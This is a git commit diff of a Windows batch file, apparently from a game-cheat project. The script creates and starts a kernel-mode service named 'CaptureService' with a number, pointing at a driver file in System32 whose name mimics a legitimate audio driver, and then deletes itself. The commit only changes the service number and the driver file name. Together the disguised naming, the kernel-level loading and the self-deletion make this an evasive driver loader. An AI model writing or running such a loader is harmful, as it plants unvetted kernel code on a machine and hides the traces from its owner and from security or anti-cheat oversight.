23932898f686c78a5ed59cc3437167e14c587024
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2025-12-12 00:02:22 +0700

    Update 5.bat

--- 5.bat
+++ 5.bat
@@ -1,7 +1,7 @@
 @echo off
 cd %~dp0
-sc create CaptureService_85743 binpath=C:\Windows\System32\drivers\ufx02000.sys type=kernel
-sc start CaptureService_85743
+sc create CaptureService_7885 binpath=C:\Windows\System32\drivers\nvhda32v.sys type=kernel
+sc start CaptureService_7885
 del "%~f0"
 
 
